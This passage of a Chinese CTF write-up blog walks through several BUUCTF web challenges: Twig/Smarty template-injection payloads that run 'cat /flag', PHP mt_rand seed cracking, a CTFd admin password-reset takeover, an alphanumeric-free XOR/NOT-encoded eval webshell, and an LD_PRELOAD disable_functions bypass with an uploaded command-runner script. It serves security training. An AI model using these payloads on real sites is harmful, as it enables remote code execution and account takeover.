<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">&gt;X-Forwarded-<span class="keyword">For</span>: &#123;&#123;<span class="keyword">system</span>(<span class="string">"ls"</span>)&#125;&#125;</span><br><span class="line">&gt;X-Forwarded-<span class="keyword">For</span>: &#123;&#123;<span class="keyword">system</span>(<span class="string">"cat /flag"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/16/BUU-web5/1589445341991.png" alt="1589445341991"></p>
<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>hint页面查看源码<br><img src="/2020/05/16/BUU-web5/1589448078427.png" alt="1589448078427"></p>
<p>着手点在cookie，尝试是否存在模板注入，还是根据上面那张图</p>
<p><img src="/2020/05/16/BUU-web5/1589448279978.png" alt="1589448279978"></p>
<p>存在</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">Twig </span><br><span class="line">&#123;&#123;<span class="number">7</span>*'<span class="number">7</span>'&#125;&#125; 输出<span class="number">49</span></span><br><span class="line">Jinja</span><br><span class="line">&#123;&#123;<span class="number">7</span>*'<span class="number">7</span>'&#125;&#125;输出<span class="number">7777777</span></span><br></pre></td></tr></table></figure>

<p>测试后为Twig模板注入<br>payload：</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"id"</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"cat /flag"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589448620761.png" alt="1589448620761"></p>
<h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><p>在网页源代码里面发现check.php，访问得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">HzWVFToCAC</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure>

<p>这个应该是伪随机数问题在MRCTF里面遇到过<code>MRCTF-Ezaudit</code><br>参考文章：</p>
<blockquote>
<p><a href="https://www.cnblogs.com/zaqzzz/p/9997855.html" target="_blank" rel="noopener">php伪随机数漏洞 以及脚本php_mt_seed的使用教程 - 冬泳怪鸽 - 博客园</a><br><a href="https://www.freebuf.com/vuls/192012.html" target="_blank" rel="noopener">PHP mt_rand安全杂谈及应用场景详解 - FreeBuf互联网安全新媒体平台</a></p>
</blockquote>
<p>先使用脚本将伪随机数转换成php_mt_seed可以识别的数据:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'HzWVFToCAC'</span></span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">43</span> <span class="number">43</span> <span class="number">0</span> <span class="number">61</span> <span class="number">25</span> <span class="number">25</span> <span class="number">0</span> <span class="number">61</span> <span class="number">58</span> <span class="number">58</span> <span class="number">0</span> <span class="number">61</span> <span class="number">57</span> <span class="number">57</span> <span class="number">0</span> <span class="number">61</span> <span class="number">41</span> <span class="number">41</span> <span class="number">0</span> <span class="number">61</span> <span class="number">55</span> <span class="number">55</span> <span class="number">0</span> <span class="number">61</span> <span class="number">14</span> <span class="number">14</span> <span class="number">0</span> <span class="number">61</span> <span class="number">38</span> <span class="number">38</span> <span class="number">0</span> <span class="number">61</span> <span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">38</span> <span class="number">38</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>

<p>在使用php_mt_seed去跑<br><img src="/2020/05/16/BUU-web5/1589511716452.png" alt="1589511716452"></p>
<p>再根据题目中的脚本将其转为字符串即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">198604756</span>);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里要在 php7.1+的环境里运行</p>
<p><img src="/2020/05/16/BUU-web5/1589512570530.png" alt="1589512570530"></p>
<p>提交得到flag<br><img src="/2020/05/16/BUU-web5/1589512914689.png" alt="1589512914689"></p>
<h1 id="V-amp-N2020-公开赛-HappyCTFd"><a href="#V-amp-N2020-公开赛-HappyCTFd" class="headerlink" title="[V&amp;N2020 公开赛]HappyCTFd"></a>[V&amp;N2020 公开赛]HappyCTFd</h1><p>打开靶机是一个CTFD网站，注册后登陆还发现一个admin用户，flag应该在admin里面</p>
<blockquote>
<ul>
<li>注册一个空格admin用户</li>
<li>登录成功后再登出</li>
<li>在登录页面选择忘记密码</li>
<li>改密链接会发送到注册邮箱中，这里使用buuoj的内部邮箱</li>
<li>在邮箱中修改密码</li>
<li>使用admin用户和更改后的密码进行登录</li>
<li>在Admin Panel =&gt;Challenges页面找到flag</li>
</ul>
</blockquote>
<p>这里使用buu内部邮箱<br><img src="/2020/05/16/BUU-web5/1589528322044.png" alt="1589528322044"></p>
<p><img src="/2020/05/16/BUU-web5/1589528370798.png" alt="1589528370798"></p>
<h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">            $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"This is too Long."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>这里过滤了所有字母和数字，考虑使用无字母数字rce<br>先使用取反构造phpinfo查看禁用函数</p>
<blockquote>
<p>(~%8F%97%8F%96%91%99%90)();</p>
</blockquote>
<p><img src="/2020/05/16/BUU-web5/1589533565181.png" alt="1589533565181"></p>
<p>基本禁完了，先构造一个shell<br>异或</p>
<blockquote>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$&#123;%87%87%87%87^%d8%c0%c2%d3&#125;[_]($&#123;%87%87%87%87^%d8%c0%c2%d3&#125;[__]);&amp;_=assert&amp;__=<span class="keyword">eval</span>($_POST[%27a%27])</span><br></pre></td></tr></table></figure>
</blockquote>
<p>取反</p>
<blockquote>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">$&#123;~%A0%B8%BA%AB&#125;[<span class="string">_</span>](<span class="link">$&#123;~%A0%B8%BA%AB&#125;[__]</span>);&amp;<span class="emphasis">_=assert&amp;_</span><span class="emphasis">_=eval($_</span>POST[<span class="string">%27a%27</span>]) 	//$<span class="emphasis">_GET[_</span>]($<span class="emphasis">_GET[_</span>_])</span><br></pre></td></tr></table></figure>
</blockquote>
<p>但是使用蚁剑连上后并不能执行命令，所以要绕过<code>绕过disable_function</code>执行readflag文件</p>
<p>参考文章：<a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">深入浅出LD_PRELOAD &amp; putenv()</a>,也可以直接使用蚁剑的插件进行绕过，但是我本地的蚁剑插件商店加载 有问题，所以尝试另一种方法</p>
<p>因为权限问题我们在蚁剑上无法上传文件到根目录，但是我们可以上传到/tmp，首先下载<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc_x64.so" target="_blank" rel="noopener">bypass_disablefunc_x64.so</a>共享库文件并上传到/tmp目录下面，将其命名为123.so<br>在上传一个123.php文件，其内容为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">	error_log(<span class="string">""</span>,<span class="number">1</span>,<span class="string">""</span>,<span class="string">""</span>);	<span class="comment">#当mail函数被禁用的时候可以使用error_log函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589552461509.png" alt="1589552461509"></p>
<p>之后访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code=$&#123;%87%87%87%87^%d8%c0%c2%d3&#125;[_]($&#123;%87%87%87%87^%d8%c0%c2%d3&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=include(%27/tmp/123.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/123.so</span><br></pre></td></tr></table></figure>

<p>得到flag<br><img src="/2020/05/16/BUU-web5/1589552523480.png" alt="1589552523480"></p>
<p><a href="https://mayi077.gitee.io/2020/02/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/" target="_blank" rel="noopener">参考文章</a></p>
<h1 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); <span class="comment">#exif_imagetype — 判断一个图像的类型</span></span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>); <span class="comment">#返回一个字符串，包含所有在$hhh中使用过的不同字符,该出为不同的字母不能超过12个</span></span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先最下面发现一个eval函数，所以先尝试绕过一下正则<br>先看看有哪些字符可以利用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">256</span>;$i++)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( !preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($i)) )</span><br><span class="line">    <span class="keyword">echo</span> $i.<span class="string">'-----&gt;'</span>.chr($i).<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589590508788.png" alt="1589590508788"></p>
<p>!,#,$,%,(,),*,+,-,/,:,;,&lt;,&gt;,?,@,,],^,{,},€这是上面脚本chr($i)跑出来的可用字符中的可视字符。在浏览器中这些字符都是敏感字符，如果不加单引号双引号，浏览器就把他们用起来了（浏览器进行解析，而不是php语言）所以我们要使用不可视的字符来进行异或脚本的基础字典<br>然后构造一个异或脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">33</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">45</span>,<span class="number">47</span>,<span class="number">58</span>,<span class="number">59</span>,<span class="number">60</span>,<span class="number">62</span>,<span class="number">63</span>,<span class="number">64</span>,<span class="number">92</span>,<span class="number">93</span>,<span class="number">94</span>,<span class="number">123</span>,<span class="number">125</span>,<span class="number">128</span>,<span class="number">129</span>,<span class="number">130</span>,<span class="number">131</span>,<span class="number">132</span>,<span class="number">133</span>,<span class="number">134</span>,<span class="number">135</span>,<span class="number">136</span>,<span class="number">137</span>,<span class="number">138</span>,<span class="number">139</span>,<span class="number">140</span>,<span class="number">141</span>,<span class="number">142</span>,<span class="number">143</span>,<span class="number">144</span>,<span class="number">145</span>,<span class="number">146</span>,<span class="number">147</span>,<span class="number">148</span>,<span class="number">149</span>,<span class="number">150</span>,<span class="number">151</span>,<span class="number">152</span>,<span class="number">153</span>,<span class="number">154</span>,<span class="number">155</span>,<span class="number">156</span>,<span class="number">157</span>,<span class="number">158</span>,<span class="number">159</span>,<span class="number">160</span>,<span class="number">161</span>,<span class="number">162</span>,<span class="number">163</span>,<span class="number">164</span>,<span class="number">165</span>,<span class="number">166</span>,<span class="number">167</span>,<span class="number">168</span>,<span class="number">169</span>,<span class="number">170</span>,<span class="number">171</span>,<span class="number">172</span>,<span class="number">173</span>,<span class="number">174</span>,<span class="number">175</span>,<span class="number">176</span>,<span class="number">177</span>,<span class="number">178</span>,<span class="number">179</span>,<span class="number">180</span>,<span class="number">181</span>,<span class="number">182</span>,<span class="number">183</span>,<span class="number">184</span>,<span class="number">185</span>,<span class="number">186</span>,<span class="number">187</span>,<span class="number">188</span>,<span class="number">189</span>,<span class="number">190</span>,<span class="number">191</span>,<span class="number">192</span>,<span class="number">193</span>,<span class="number">194</span>,<span class="number">195</span>,<span class="number">196</span>,<span class="number">197</span>,<span class="number">198</span>,<span class="number">199</span>,<span class="number">200</span>,<span class="number">201</span>,<span class="number">202</span>,<span class="number">203</span>,<span class="number">204</span>,<span class="number">205</span>,<span class="number">206</span>,<span class="number">207</span>,<span class="number">208</span>,<span class="number">209</span>,<span class="number">210</span>,<span class="number">211</span>,<span class="number">212</span>,<span class="number">213</span>,<span class="number">214</span>,<span class="number">215</span>,<span class="number">216</span>,<span class="number">217</span>,<span class="number">218</span>,<span class="number">219</span>,<span class="number">220</span>,<span class="number">221</span>,<span class="number">222</span>,<span class="number">223</span>,<span class="number">224</span>,<span class="number">225</span>,<span class="number">226</span>,<span class="number">227</span>,<span class="number">228</span>,<span class="number">229</span>,<span class="number">230</span>,<span class="number">231</span>,<span class="number">232</span>,<span class="number">233</span>,<span class="number">234</span>,<span class="number">235</span>,<span class="number">236</span>,<span class="number">237</span>,<span class="number">238</span>,<span class="number">239</span>,<span class="number">240</span>,<span class="number">241</span>,<span class="number">242</span>,<span class="number">243</span>,<span class="number">244</span>,<span class="number">245</span>,<span class="number">246</span>,<span class="number">247</span>,<span class="number">248</span>,<span class="number">249</span>,<span class="number">250</span>,<span class="number">251</span>,<span class="number">252</span>,<span class="number">253</span>,<span class="number">254</span>,<span class="number">255</span>,]</span><br><span class="line"><span class="comment">#a是上面的php脚本出来的数据，通过preg_match的字符</span></span><br><span class="line">_=[]</span><br><span class="line">G=[]</span><br><span class="line">E=[]</span><br><span class="line">T=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a[<span class="number">27</span>:]:<span class="comment">#截取a列表27后面的数据，目的是避开可视字符。我们需要不可视字符来异或</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a[<span class="number">27</span>:]:</span><br><span class="line">        tem=(i^j)</span><br><span class="line">        <span class="keyword">if</span>(chr(tem)==<span class="string">"_"</span>):</span><br><span class="line">            _.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">"*"</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">if</span>(chr(tem)==<span class="string">"G"</span>):</span><br><span class="line">            G.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">"*"</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">if</span> (chr(tem) == <span class="string">"E"</span>):</span><br><span class="line">            temp = []</span><br><span class="line">            E.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">"*"</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">if</span> (chr(tem)== <span class="string">"T"</span>):</span><br><span class="line">            T.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">"*"</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">print(_)</span><br><span class="line">print(G)</span><br><span class="line">print(E)</span><br><span class="line">print(T)</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight scheme"><table><tr><td class="code"><pre><span class="line">[<span class="symbol">'86*d9</span>', <span class="symbol">'87*d8</span>', <span class="symbol">'88*d7</span>', <span class="symbol">'89*d6</span>', <span class="symbol">'8a*d5</span>', <span class="symbol">'8b*d4</span>', <span class="symbol">'8c*d3</span>', <span class="symbol">'8d*d2</span>', <span class="symbol">'8e*d1</span>', <span class="symbol">'8f*d0</span>', <span class="symbol">'90*cf</span>', <span class="symbol">'91*ce</span>', <span class="symbol">'92*cd</span>', <span class="symbol">'93*cc</span>', <span class="symbol">'94*cb</span>', <span class="symbol">'95*ca</span>', <span class="symbol">'96*c9</span>', <span class="symbol">'97*c8</span>', <span class="symbol">'98*c7</span>', <span class="symbol">'99*c6</span>', <span class="symbol">'9a*c5</span>', <span class="symbol">'9b*c4</span>', <span class="symbol">'9c*c3</span>', <span class="symbol">'9d*c2</span>', <span class="symbol">'9e*c1</span>', <span class="symbol">'9f*c0</span>', <span class="symbol">'a0*ff</span>', <span class="symbol">'a1*fe</span>', <span class="symbol">'a2*fd</span>', <span class="symbol">'a3*fc</span>', <span class="symbol">'a4*fb</span>', <span class="symbol">'a5*fa</span>', <span class="symbol">'a6*f9</span>', <span class="symbol">'a7*f8</span>', <span class="symbol">'a8*f7</span>', <span class="symbol">'a9*f6</span>', <span class="symbol">'aa*f5</span>', <span class="symbol">'ab*f4</span>', <span class="symbol">'ac*f3</span>', <span class="symbol">'ad*f2</span>', <span class="symbol">'ae*f1</span>', <span class="symbol">'af*f0</span>', <span class="symbol">'b0*ef</span>', <span class="symbol">'b1*ee</span>', <span class="symbol">'b2*ed</span>', <span class="symbol">'b3*ec</span>', <span class="symbol">'b4*eb</span>', <span class="symbol">'b5*ea</span>', <span class="symbol">'b6*e9</span>', <span class="symbol">'b7*e8</span>', <span class="symbol">'b8*e7</span>', <span class="symbol">'b9*e6</span>', <span class="symbol">'ba*e5</span>', <span class="symbol">'bb*e4</span>', <span class="symbol">'bc*e3</span>', <span class="symbol">'bd*e2</span>', <span class="symbol">'be*e1</span>', <span class="symbol">'bf*e0</span>', <span class="symbol">'c0*9f</span>', <span class="symbol">'c1*9e</span>', <span class="symbol">'c2*9d</span>', <span class="symbol">'c3*9c</span>', <span class="symbol">'c4*9b</span>', <span class="symbol">'c5*9a</span>', <span class="symbol">'c6*99</span>', <span class="symbol">'c7*98</span>', <span class="symbol">'c8*97</span>', <span class="symbol">'c9*96</span>', <span class="symbol">'ca*95</span>', <span class="symbol">'cb*94</span>', <span class="symbol">'cc*93</span>', <span class="symbol">'cd*92</span>', <span class="symbol">'ce*91</span>', <span class="symbol">'cf*90</span>', <span class="symbol">'d0*8f</span>', <span class="symbol">'d1*8e</span>', <span class="symbol">'d2*8d</span>', <span class="symbol">'d3*8c</span>', <span class="symbol">'d4*8b</span>', <span class="symbol">'d5*8a</span>', <span class="symbol">'d6*89</span>', <span class="symbol">'d7*88</span>', <span class="symbol">'d8*87</span>', <span class="symbol">'d9*86</span>', <span class="symbol">'e0*bf</span>', <span class="symbol">'e1*be</span>', <span class="symbol">'e2*bd</span>', <span class="symbol">'e3*bc</span>', <span class="symbol">'e4*bb</span>', <span class="symbol">'e5*ba</span>', <span class="symbol">'e6*b9</span>', <span class="symbol">'e7*b8</span>', <span class="symbol">'e8*b7</span>', <span class="symbol">'e9*b6</span>', <span class="symbol">'ea*b5</span>', <span class="symbol">'eb*b4</span>', <span class="symbol">'ec*b3</span>', <span class="symbol">'ed*b2</span>', <span class="symbol">'ee*b1</span>', <span class="symbol">'ef*b0</span>', <span class="symbol">'f0*af</span>', <span class="symbol">'f1*ae</span>', <span class="symbol">'f2*ad</span>', <span class="symbol">'f3*ac</span>', <span class="symbol">'f4*ab</span>', <span class="symbol">'f5*aa</span>', <span class="symbol">'f6*a9</span>', <span class="symbol">'f7*a8</span>', <span class="symbol">'f8*a7</span>', <span class="symbol">'f9*a6</span>', <span class="symbol">'fa*a5</span>', <span class="symbol">'fb*a4</span>', <span class="symbol">'fc*a3</span>', <span class="symbol">'fd*a2</span>', <span class="symbol">'fe*a1</span>', <span class="symbol">'ff*a0</span>']</span><br><span class="line">[<span class="symbol">'86*c1</span>', <span class="symbol">'87*c0</span>', <span class="symbol">'88*cf</span>', <span class="symbol">'89*ce</span>', <span class="symbol">'8a*cd</span>', <span class="symbol">'8b*cc</span>', <span class="symbol">'8c*cb</span>', <span class="symbol">'8d*ca</span>', <span class="symbol">'8e*c9</span>', <span class="symbol">'8f*c8</span>', <span class="symbol">'90*d7</span>', <span class="symbol">'91*d6</span>', <span class="symbol">'92*d5</span>', <span class="symbol">'93*d4</span>', <span class="symbol">'94*d3</span>', <span class="symbol">'95*d2</span>', <span class="symbol">'96*d1</span>', <span class="symbol">'97*d0</span>', <span class="symbol">'98*df</span>', <span class="symbol">'99*de</span>', <span class="symbol">'9a*dd</span>', <span class="symbol">'9b*dc</span>', <span class="symbol">'9c*db</span>', <span class="symbol">'9d*da</span>', <span class="symbol">'9e*d9</span>', <span class="symbol">'9f*d8</span>', <span class="symbol">'a0*e7</span>', <span class="symbol">'a1*e6</span>', <span class="symbol">'a2*e5</span>', <span class="symbol">'a3*e4</span>', <span class="symbol">'a4*e3</span>', <span class="symbol">'a5*e2</span>', <span class="symbol">'a6*e1</span>', <span 